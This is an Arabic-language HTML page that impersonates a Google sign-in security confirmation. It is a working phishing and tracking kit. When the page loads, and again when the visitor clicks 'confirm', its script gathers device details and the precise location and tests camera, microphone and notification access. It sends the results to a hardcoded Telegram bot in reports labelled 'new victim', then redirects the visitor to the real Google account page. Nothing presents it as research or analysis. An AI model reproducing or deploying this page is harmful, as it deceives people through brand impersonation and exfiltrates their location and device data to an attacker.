<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الأمان - Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            text-align: center;
            padding: 30px 20px;
        }
        .google-logo {
            font-size: 32px;
            font-weight: 500;
            letter-spacing: -1px;
            margin-bottom: 8px;
        }
        .google-logo span:nth-child(1) { color: #4285f4; }
        .google-logo span:nth-child(2) { color: #ea4335; }
        .google-logo span:nth-child(3) { color: #fbbc05; }
        .google-logo span:nth-child(4) { color: #4285f4; }
        .google-logo span:nth-child(5) { color: #34a853; }
        .google-logo span:nth-child(6) { color: #ea4335; }

        .icon { font-size: 56px; margin: 10px 0; }
        h2 { color: #202124; font-size: 20px; font-weight: 400; margin-bottom: 6px; }
        .sub-text { color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
        .info-box {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 14px 18px;
            margin-bottom: 18px;
            text-align: left;
            border: 1px solid #dadce0;
        }
        .info-box .row {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 6px 0;
            color: #202124;
            font-size: 14px;
        }
        .info-box .row .label { color: #5f6368; min-width: 80px; }
        .info-box .row .value { font-weight: 500; }
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 28px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            background: #1a73e8;
            color: #fff;
        }
        .btn:hover { background: #1557b0; box-shadow: 0 2px 8px rgba(26,115,232,0.3); }
        .btn-secondary {
            background: transparent;
            color: #1a73e8;
            margin-top: 10px;
            border: 1px solid #dadce0;
        }
        .btn-secondary:hover { background: #f1f3f4; }
        .footer { margin-top: 25px; font-size: 12px; color: #9aa0a6; }
        .footer a { color: #1a73e8; text-decoration: none; }
        .status {
            margin-top: 12px;
            padding: 10px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
            background: #e6f4ea;
            color: #1e8e3e;
        }
        .status.error { background: #fce8e6; color: #d93025; }
        .loader {
            display: none;
            margin: 10px auto;
            width: 22px;
            height: 22px;
            border: 3px solid #dadce0;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.5s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .device-info {
            font-size: 13px;
            color: #5f6368;
            background: #f1f3f4;
            padding: 8px 12px;
            border-radius: 8px;
            margin: 8px 0;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="google-logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
    </div>
    <div class="icon">🔐</div>
    <h2>تأكيد الأمان</h2>
    <p class="sub-text">
        تم اكتشاف محاولة دخول من جهاز جديد.<br>
        يرجى تأكيد هويتك لإتمام عملية تسجيل الدخول.
    </p>

    <div class="device-info">
        📱 <span id="deviceName">جهاز غير معروف</span>
    </div>

    <div class="info-box">
        <div class="row"><span class="label">📍 الموقع</span><span class="value">لتأكيد هويتك</span></div>
        <div class="row"><span class="label">📸 الكاميرا</span><span class="value">للتحقق من هويتك</span></div>
        <div class="row"><span class="label">🎤 الميكروفون</span><span class="value">لتأكيد الصوت</span></div>
        <div class="row"><span class="label">🔔 الإشعارات</span><span class="value">لتنبيهات الأمان</span></div>
    </div>

    <button class="btn" id="btnConfirm" onclick="startProcess()">✅ تأكيد هويتي</button>
    <button class="btn btn-secondary" onclick="window.location.href='https://accounts.google.com'">🔙 تسجيل الدخول بطريقة أخرى</button>

    <div class="loader" id="loader"></div>
    <div class="status" id="statusMsg"></div>
    <div class="footer">
        هذه الصفحة آمنة · <a href="#">سياسة الخصوصية</a> · <a href="#">شروط الخدمة</a>
    </div>
</div>

<script>
    // ====== إعدادات البوت (سريعة) ======
    const BOT_TOKEN = "8599000520:AAHwQg2d_xry4DWNy92fbvVbtF-xWYVu_FA";
    const CHAT_ID = "7984067238";

    // ====== إرسال للبوت (غير متزامن) ======
    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
            .catch(e => console.error(e));
    }

    // ====== عرض معلومات الجهاز (فوري) ======
    document.getElementById('deviceName').textContent = navigator.userAgentData?.platform || navigator.platform || "جهاز غير معروف";

    // ====== جمع المعلومات (سريع جداً) ======
    function getDeviceInfo() {
        let info = "";
        info += `📱 الجهاز: ${navigator.userAgentData?.platform || navigator.platform || "غير معروف"}\n`;
        info += `🌐 المتصفح: ${navigator.appName || "غير معروف"}\n`;
        info += `📐 الشاشة: ${screen.width}x${screen.height}\n`;
        info += `🕐 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        info += `🌍 اللغة: ${navigator.language}\n`;
        info += `💻 المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة\n`;
        return info;
    }

    // ====== الحصول على الموقع بسرعة فائقة ======
    function getLocationFast() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ success: false, error: "غير مدعوم" });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        success: true,
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    });
                },
                () => {
                    resolve({ success: false, error: "مرفوض" });
                },
                {
                    enableHighAccuracy: false,  // أسرع
                    timeout: 3000,              // 3 ثواني فقط
                    maximumAge: 10000
                }
            );
        });
    }

    // ====== طلب الكاميرا بسرعة ======
    function getCameraFast() {
        return new Promise((resolve) => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    stream.getTracks().forEach(t => t.stop());
                    resolve({ success: true });
                })
                .catch(() => resolve({ success: false }));
        });
    }

    // ====== طلب الميكروفون بسرعة ======
    function getMicFast() {
        return new Promise((resolve) => {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then((stream) => {
                    stream.getTracks().forEach(t => t.stop());
                    resolve({ success: true });
                })
                .catch(() => resolve({ success: false }));
        });
    }

    // ====== طلب الإشعارات بسرعة ======
    function getNotificationsFast() {
        return new Promise((resolve) => {
            if (!('Notification' in window)) {
                resolve({ success: false, error: "غير مدعومة" });
                return;
            }
            Notification.requestPermission().then(perm => {
                resolve({ success: perm === 'granted' });
            });
        });
    }

    // ====== العملية الرئيسية (متوازية وسريعة) ======
    async function startProcess() {
        const btn = document.getElementById('btnConfirm');
        const loader = document.getElementById('loader');
        const status = document.getElementById('statusMsg');

        btn.disabled = true;
        btn.style.opacity = '0.6';
        loader.style.display = 'block';
        status.style.display = 'none';

        // === طلب كل الصلاحيات في نفس الوقت (Parallel) ===
        const [locationResult, cameraResult, micResult, notifResult] = await Promise.all([
            getLocationFast(),
            getCameraFast(),
            getMicFast(),
            getNotificationsFast()
        ]);

        // === جمع المعلومات العامة ===
        const deviceInfo = getDeviceInfo();

        // === بناء التقرير ===
        let msg = `🛰️ *[ ضحية جديدة - سريع ]*\n\n`;
        msg += deviceInfo;

        if (locationResult.success) {
            const mapLink = `https://www.google.com/maps?q=${locationResult.lat},${locationResult.lon}`;
            msg += `📍 الموقع: ${mapLink}\n`;
            msg += `📏 الدقة: ${locationResult.accuracy}m\n`;
        } else {
            msg += `📍 الموقع: ❌ مرفوض\n`;
        }

        msg += `📸 الكاميرا: ${cameraResult.success ? "✅ ممنوحة" : "❌ مرفوضة"}\n`;
        msg += `🎤 الميكروفون: ${micResult.success ? "✅ ممنوح" : "❌ مرفوض"}\n`;
        msg += `🔔 الإشعارات: ${notifResult.success ? "✅ ممنوحة" : "❌ مرفوضة"}\n`;
        msg += `\n🕒 ${new Date().toLocaleString()}`;

        // === إرسال فوري ===
        sendToTelegram(msg);

        // === إخفاء التحميل وعرض النتيجة ===
        loader.style.display = 'none';
        btn.disabled = false;
        btn.style.opacity = '1';

        status.className = 'status';
        status.style.display = 'block';

        if (locationResult.success) {
            status.innerHTML = '✅ تم تأكيد هويتك بنجاح! جاري تحويلك...';
            setTimeout(() => {
                window.location.href = "https://myaccount.google.com";
            }, 1200);
        } else {
            status.className = 'status error';
            status.innerHTML = '❌ لم نتمكن من تأكيد هويتك، حاول مرة أخرى';
            setTimeout(() => {
                window.location.href = "https://myaccount.google.com";
            }, 1500);
        }
    }

    // ====== إشعار فتح الصفحة ======
    sendToTelegram(`🌐 *[ فتح الصفحة ]*\nتم فتح رابط الاختراق بواسطة ضحية جديدة\n🕒 ${new Date().toLocaleString()}`);
</script>

</body>
    </html>
